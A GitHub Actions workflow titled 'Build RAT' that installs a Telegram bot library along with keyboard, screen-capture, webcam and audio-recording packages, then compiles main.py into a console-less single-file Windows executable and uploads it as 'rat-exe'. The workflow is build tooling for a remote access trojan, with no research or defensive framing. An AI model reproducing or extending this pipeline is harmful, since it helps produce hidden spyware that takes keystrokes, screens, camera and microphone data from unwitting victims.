name: Build RAT
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install pyinstaller
          pip install pyTelegramBotAPI psutil opencv-python pyautogui pillow keyboard pywin32 cryptography sounddevice scipy numpy pycaw

      - name: Build EXE
        run: |
          pyinstaller --noconsole --onefile main.py

      - uses: actions/upload-artifact@v4
        with:
          name: rat-exe
          path: dist/main.exe
